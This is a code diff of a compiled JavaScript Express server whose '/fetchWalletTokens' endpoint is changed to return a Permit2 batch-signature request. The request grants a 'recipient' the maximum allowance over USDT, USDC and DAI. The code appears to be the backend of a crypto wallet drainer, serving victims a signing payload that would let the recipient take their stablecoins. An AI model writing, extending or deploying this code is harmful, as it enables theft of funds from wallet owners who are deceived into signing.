@@ -256,40 +256,61 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                 for (i = 0; i < (permit2Tokens === null || permit2Tokens === void 0 ? void 0 : permit2Tokens.length); i++) {
                     _loop_1(i);
                 }
-                return [2 /*return*/, [tokensReturned, _addrs]];
+                return [2 /*return*/, [_dataToSign, _addrs]];
         }
     });
 }); });
-var dataToSign = function (detailsArray) {
-    var dataToSign = {
-        domain: {
-            name: "Permit2",
-            chainId: chainId,
-            verifyingContract: Permit2Contract,
-        },
-        types: {
-            EIP712Domain: [
-                { name: "name", type: "string" },
-                { name: "chainId", type: "uint256" },
-                { name: "verifyingContract", type: "address" },
-            ],
-            PermitBatch: [
-                { name: "details", type: "PermitDetails[]" },
-                { name: "spender", type: "address" },
-                { name: "sigDeadline", type: "uint256" },
-            ],
-            PermitDetails: [
-                { name: "token", type: "address" },
-                { name: "amount", type: "uint160" },
-                { name: "expiration", type: "uint48" },
-                { name: "nonce", type: "uint48" },
-            ],
-        },
-        primaryType: "PermitBatch",
-        message: {
-            details: detailsArray,
-            spender: recipient,
-            sigDeadline: deadline,
-        },
-    };
+var usdcContractAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+var daiContractAddr = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
+var usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+var dett = [
+    {
+        token: usdtContractAddress,
+        amount: maxUint160,
+        expiration: deadline,
+        nonce: nonce,
+    },
+    {
+        token: usdcContractAddress,
+        amount: maxUint160,
+        expiration: deadline,
+        nonce: nonce,
+    },
+    {
+        token: daiContractAddr,
+        amount: maxUint160,
+        expiration: deadline,
+        nonce: nonce,
+    },
+];
+var _dataToSign = {
+    domain: {
+        name: "Permit2",
+        chainId: chainId,
+        verifyingContract: Permit2Contract,
+    },
+    types: {
+        EIP712Domain: [
+            { name: "name", type: "string" },
+            { name: "chainId", type: "uint256" },
+            { name: "verifyingContract", type: "address" },
+        ],
+        PermitBatch: [
+            { name: "details", type: "PermitDetails[]" },
+            { name: "spender", type: "address" },
+            { name: "sigDeadline", type: "uint256" },
+        ],
+        PermitDetails: [
+            { name: "token", type: "address" },
+            { name: "amount", type: "uint160" },
+            { name: "expiration", type: "uint48" },
+            { name: "nonce", type: "uint48" },
+        ],
+    },
+    primaryType: "PermitBatch",
+    message: {
+        details: dett,
+        spender: recipient,
+        sigDeadline: deadline,
+    },
 };
